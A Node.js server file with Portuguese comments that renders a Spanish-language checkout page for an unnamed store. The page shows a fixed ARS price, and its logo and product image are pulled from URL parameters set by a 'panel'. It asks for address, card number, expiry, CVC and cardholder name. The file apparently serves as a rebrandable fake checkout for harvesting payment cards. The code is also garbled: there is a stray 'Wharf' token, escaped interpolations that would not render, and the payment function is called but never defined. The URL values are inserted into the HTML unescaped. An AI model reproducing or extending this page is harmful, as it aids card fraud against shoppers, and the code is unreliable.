const http = require('http');
const url = require('url'); // Módulo nativo para ler os dados da URL

const PORT = process.env.PORT || 3010;

const traducoes = {
    es: {
        resumo: "Mostrar resumen del pedido",
        contacto: "Contacto",
        email: "Correo electrónico o número de teléfono móvil",
        ofertas: "Enviarme novedades y ofertas por correo electrónico",
        entrega: "Entrega",
        nombre: "Nombre",
        apellido: "Apellido",
        direccion: "Dirección",
        apartamento: "Casa, apartamento, etc. (opcional)",
        ciudad: "Ciudad",
        provincia: "Provincia",
        codigo_postal: "Código postal",
        telefono: "Teléfono (para novedades de envío)",
        metodo_envio: "Método de envío",
        gratis: "Gratis",
        pago: "Pago",
        cripto: "🔒 Transacción encriptada",
        tarjeta: "Tarjeta de crédito",
        num_tarjeta: "Número de tarjeta",
        vencimento: "Expiración (MM/AA)",
        cvc: "Código de seguridad",
        nome_tarjeta: "Nombre en la tarjeta",
        btn_pagar: "Pagar ahora",
        procesando: "Procesando...",
        subtotal: "Subtotal",
        total: "Total"
    }
};

function formatarMoedaInternacional(valorCentavos) {
    return new Intl.NumberFormat('es-AR', {
        minimumFractionDigits: 2,
        maximumFractionDigits: 2
    }).format(valorCentavos / 100);
}

const server = http.createServer((req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        res.writeHead(200);
        res.end();
        return;
    }

    // Analisa a URL para pegar as variáveis dinâmicas do painel
    const parsedUrl = url.parse(req.url, true);
    
    if (parsedUrl.pathname.startsWith('/pay/')) {
        const t = traducoes['es'];
        const totalProductsPrice = 4167508; 
        const freteInicial = 0;
        const valorTotalInicial = totalProductsPrice + freteInicial;

        // Puxa dinamicamente os dados enviados pelo Painel. Se não enviar nada, fica vazio.
        const logoUrl = parsedUrl.query.logo || ''; 
        const itemImage = parsedUrl.query.produto || '';

        res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
        res.end(`
        <!DOCTYPE html>
        <html lang="es">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Checkout</title>
            <script src="https://cdn.tailwindcss.com"></script>
            <style>
                @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&display=swap');
                body { font-family: 'Inter', sans-serif; background-color: #ffffff; }
                input:focus { outline: none !important; background-color: #fff !important; }
                .accordion-content { transition: max-height 0.2s ease-out; max-height: 0; overflow: hidden; }
                .accordion-content.open { max-height: 500px; }
            </style>
        </head>
        <body class="text-gray-800 antialiased flex flex-col min-h-screen text-[12px] bg-white">

            <div class="w-full bg-white border-b border-gray-100 py-3.5 flex justify-center">
                \${logoUrl ? \`<img src="\${logoUrl}" alt="Logo Store" class="h-4 object-contain">\` : \`<span class="text-gray-400 font-medium tracking-wider uppercase">Tu Tienda</span>\`}
            </div>

            <div class="w-full bg-gray-50 border-b border-gray-200">
                <button onclick="toggleResumo()" class="w-full max-w-xl mx-auto px-4 py-3 flex justify-between items-center text-[12px] font-normal focus:outline-none">
                    <div class="flex items-center space-x-2 text-blue-600">
                        <svg xmlns="http://www.w3.org/2000/svg" class="h-3.5 w-3.5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 3h2l.4 2M7 13h10l4-8H5.4M7 13L5.4 5M7 13l-2.293 2.293c-.63.63-.184 1.707.707 1.707H17m0 0a2 2 0 100 4 2 2 0 000-4zm-8 0a2 2 0 100 4 2 2 0 000-4z" />
                        </svg>
                        <span class="hover:underline">\${t.resumo}</span>
                        <svg id="arrow-icon" xmlns="http://www.w3.org/2000/svg" class="h-3 w-3 transform transition-transform duration-200" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7" />
                        </svg>
                    </div>
                    <span id="topo-total-val" class="font-medium text-gray-950">ARS $ \${formatarMoedaInternacional(valorTotalInicial)}</span>
                </button>
                
                <div id="conteudo-resumo" class="accordion-content bg-gray-50 border-t border-gray-200">
                    <div class="max-w-xl mx-auto px-4 py-3 space-y-2">
                        <div class="flex items-center justify-between bg-white p-2 border border-gray-100 rounded">
                            <div class="flex items-center space-x-2.5">
                                <div class="relative bg-white border border-gray-200 rounded p-0.5 flex-shrink-0">
                                    \${itemImage ? \`<img src="\${itemImage}" class="w-9 h-9 object-cover rounded">\` : \`<div class="w-9 h-9 bg-gray-100 rounded"></div>\` Wharf}
                                    <span class="absolute -top-1.5 -right-1.5 bg-gray-500 text-white w-3.5 h-3.5 rounded-full text-[9px] flex items-center justify-center font-medium">1</span>
                                </div>
                                <div>
                                    <p class="font-medium text-gray-900">Producto de la Tienda</p>
                                    <p class="text-[10px] text-gray-400">Variante seleccionada</p>
                                </div>
                            </div>
                            <span class="font-medium text-gray-900">ARS $ \${formatarMoedaInternacional(totalProductsPrice)}</span>
                        </div>
                    </div>
                </div>
            </div>

            <div class="flex-grow max-w-xl mx-auto w-full px-4 py-5 space-y-5">
                <div class="space-y-2">
                    <h2 class="text-[13px] font-medium text-gray-900 tracking-tight">\${t.contacto}</h2>
                    <div class="border border-gray-300 rounded bg-white">
                        <input type="text" id="email" placeholder="\${t.email}" class="w-full px-3 py-2.5 text-[12px] placeholder-gray-400 bg-transparent rounded-sm" required>
                    </div>
                    <label class="flex items-start space-x-2 text-[11px] text-gray-500 cursor-pointer select-none pt-0.5 leading-tight">
                        <input type="checkbox" checked class="w-3.5 h-3.5 mt-0.5 rounded border-gray-300 text-black focus:ring-0 accent-black">
                        <span>\${t.ofertas}</span>
                    </label>
                </div>

                <div class="space-y-2">
                    <h2 class="text-[13px] font-medium text-gray-900 tracking-tight">\${t.entrega}</h2>
                    <div class="border border-gray-300 rounded bg-white divide-y divide-gray-200 overflow-hidden">
                        <div class="grid grid-cols-2 divide-x divide-gray-200">
                            <input type="text" id="nombre" placeholder="\${t.nombre}" class="w-full px-3 py-2.5 text-[12px] placeholder-gray-400 bg-transparent" required>
                            <input type="text" id="apellido" placeholder="\${t.apellido}" class="w-full px-3 py-2.5 text-[12px] placeholder-gray-400 bg-transparent" required>
                        </div>
                        <input type="text" id="direccion" placeholder="\${t.direccion}" class="w-full px-3 py-2.5 text-[12px] placeholder-gray-400 bg-transparent" required>
                        <input type="text" id="apartamento" placeholder="\${t.apartamento}" class="w-full px-3 py-2.5 text-[12px] placeholder-gray-400 bg-transparent">
                        <div class="grid grid-cols-3 divide-x divide-gray-200">
                            <input type="text" id="ciudad" placeholder="\${t.ciudad}" class="w-full px-3 py-2.5 text-[12px] placeholder-gray-400 bg-transparent" required>
                            <input type="text" id="provincia" placeholder="\${t.provincia}" class="w-full px-3 py-2.5 text-[12px] placeholder-gray-400 bg-transparent" required>
                            <input type="text" id="codigo_postal" placeholder="\${t.codigo_postal}" class="w-full px-3 py-2.5 text-[12px] placeholder-gray-400 bg-transparent" required>
                        </div>
                        <input type="tel" id="telefono" placeholder="\${t.telefono}" class="w-full px-3 py-2.5 text-[12px] placeholder-gray-400 bg-transparent" required>
                    </div>
                </div>

                <div class="space-y-2">
                    <h2 class="text-[13px] font-medium text-gray-900 tracking-tight">\${t.metodo_envio}</h2>
                    <div class="border border-gray-300 rounded bg-white divide-y divide-gray-200 overflow-hidden">
                        <label id="label-envio_express" class="flex justify-between items-center p-3 bg-gray-50 text-[12px] cursor-pointer shipping-label">
                            <div class="flex items-center space-x-2.5">
                                <input type="radio" name="shipping_method" value="envio_express" data-price="0" checked class="w-3.5 h-3.5 text-black focus:ring-0 accent-black" onchange="alterarFreteDoPainel(this)">
                                <span class="text-gray-600 font-normal">Envío Express Internacional</span>
                            </div>
                            <span class="font-medium text-gray-900">\${t.gratis}</span>
                        </label>
                    </div>
                </div>

                <div class="space-y-2">
                    <h2 class="text-[13px] font-medium text-gray-900 tracking-tight">\${t.pago}</h2>
                    <div class="border border-gray-300 rounded overflow-hidden bg-white">
                        <div class="flex justify-between items-center px-3 py-2.5 border-b border-gray-200 bg-gray-50">
                            <span class="font-medium text-gray-700">\${t.tarjeta}</span>
                        </div>
                        <div class="bg-white divide-y divide-gray-200">
                            <input type="text" id="card_number" placeholder="\${t.num_tarjeta}" class="w-full px-3 py-2.5 text-[12px] placeholder-gray-400 bg-transparent" maxlength="19" required>
                            <div class="grid grid-cols-2 divide-x divide-gray-200">
                                <input type="text" id="card_expiry" placeholder="\${t.vencimento}" class="w-full px-3 py-2.5 text-[12px] placeholder-gray-400 bg-transparent" maxlength="5" required>
                                <input type="text" id="card_cvc" placeholder="\${t.cvc}" class="w-full px-3 py-2.5 text-[12px] placeholder-gray-400 bg-transparent" maxlength="4" required>
                            </div>
                            <input type="text" id="card_name" placeholder="\${t.nome_tarjeta}" class="w-full px-3 py-2.5 text-[12px] placeholder-gray-400 bg-transparent" required>
                        </div>
                    </div>
                </div>

                <div class="pt-4 border-t border-gray-200 space-y-1.5 text-[12px] text-gray-500">
                    <div class="flex justify-between">
                        <span class="font-normal text-gray-500">\${t.subtotal}</span>
                        <span class="font-normal text-gray-900">ARS $ \${formatarMoedaInternacional(totalProductsPrice)}</span>
                    </div>
                    <div class="flex justify-between">
                        <span class="font-normal text-gray-500">Envío</span>
                        <span id="final-frete-val" class="font-normal text-gray-900">\${t.gratis}</span>
                    </div>
                    <div class="flex justify-between items-baseline pt-2 text-gray-900">
                        <span class="text-sm font-medium text-gray-900">\${t.total}</span>
                        <div class="flex items-baseline space-x-1">
                            <span class="text-[10px] text-gray-400 mr-0.5 font-normal">ARS</span>
                            <span id="final-total-val" class="text-base font-medium tracking-tight text-gray-950">$ \${formatarMoedaInternacional(valorTotalInicial)}</span>
                        </div>
                    </div>
                </div>

                <button onclick="enviarPagamento()" id="btn-pagar" class="w-full mt-1 bg-black text-white py-3.5 rounded font-medium text-[13px] hover:opacity-90 transition-all shadow-sm">
                    \${t.btn_pagar}
                </button>
            </div>

            <script>
                const baseProductsPrice = \${totalProductsPrice};
                const termoGratis = "\${t.gratis}";

                function formatarJS(valorCentavos) {
                    return '$ ' + new Intl.NumberFormat('es-AR', { minimumFractionDigits: 2, maximumFractionDigits: 2 }).format(valorCentavos / 100);
                }

                function toggleResumo() {
                    const conteudo = document.getElementById('conteudo-resumo');
                    const seta = document.getElementById('arrow-icon');
                    conteudo.classList.toggle('open');
                    seta.classList.toggle('rotate-180', conteudo.classList.contains('open'));
                }

                document.getElementById('card_number').addEventListener('input', function (e) {
                    e.target.value = e.target.value.replace(/[^0-9]/g, '').replace(/(.{4})/g, '$1 ').trim();
                });

                document.getElementById('card_expiry').addEventListener('input', function (e) {
                    let v = e.target.value.replace(/[^0-9]/g, '');
                    if (v.length >= 2) v = v.substring(0,2) + '/' + v.substring(2,4);
                    e.target.value = v;
                });
            </script>
        </body>
        </html>
        `);
    } else {
        res.writeHead(404, { 'Content-Type': 'text/plain' });
        res.end('Not Found');
    }
});

server.listen(PORT, () => {
    console.log(`\n✨ [SERVIDO LIMPO E DINÂMICO INICIADO]`);
    console.log(`👉 Teste básico: http://localhost:\${PORT}/pay/teste`);
    console.log(`👉 Teste com dados do Painel: http://localhost:\${PORT}/pay/teste?logo=LINK_DA_LOGO_AQUI&produto=LINK_DA_FOTO_AQUI\n`);
});